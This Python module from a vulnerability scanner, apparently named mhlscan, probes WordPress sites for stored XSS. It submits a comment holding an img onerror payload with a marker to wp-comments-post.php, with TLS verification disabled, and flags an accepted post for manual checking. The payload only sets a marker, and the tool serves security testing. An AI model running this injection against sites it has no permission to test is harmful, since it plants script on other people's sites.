# GNU GPL License V3
# mhlscan by sigit-hdteamlabs

# -*- coding: utf-8 -*-
"""WordPress Stored XSS - comment form detection."""

from ._base import cve_module


@cve_module(
    cve_id="WP-STORED-XSS",
    name="WordPress Stored XSS (comment form)",
    severity="high",
    requires=["wordpress"],
    timeout=45,
    description="Inject XSS payload ke form comment, manual verify stored",
    aggressive=False,
)
def test(url, timeout=45, oast_url=None, **kwargs):
    try:
        import requests
        import uuid

        requests.packages.urllib3.disable_warnings()
        base = url.rstrip("/")

        endpoint = base + "/wp-comments-post.php"
        marker = "MHL_" + uuid.uuid4().hex[:8]
        xss_payload = (
            '<img src=x onerror="window.__xss_' + marker + '=true" '
            'data-mhl="' + marker + '">'
        )

        payload = {
            "comment": xss_payload,
            "author": "MHLTest_" + marker,
            "email": marker + "@example.com",
            "url": "",
            "comment_post_ID": "1",
            "comment_parent": "0",
            "submit": "Post Comment",
        }

        try:
            r = requests.post(endpoint, data=payload,
                              timeout=timeout, verify=False)
            if r.status_code in (200, 302):
                return {
                    "status": "potential",
                    "details": "Comment submitted, manual verify",
                    "endpoint": "/wp-comments-post.php",
                    "evidence": "Marker: " + marker,
                    "payload_file": endpoint,
                    "upload_endpoints": [
                        {"path": "/wp-comments-post.php",
                         "label": "wp-comments-post",
                         "status": r.status_code},
                    ],
                }
        except Exception:
            pass

        return {"status": "not_vulnerable",
                "details": "Comment submission not accepted"}
    except ImportError:
        return {"status": "error",
                "details": "requests not installed"}
    except Exception as e:
        return {"status": "error", "details": type(e).__name__ + ": " + str(e)}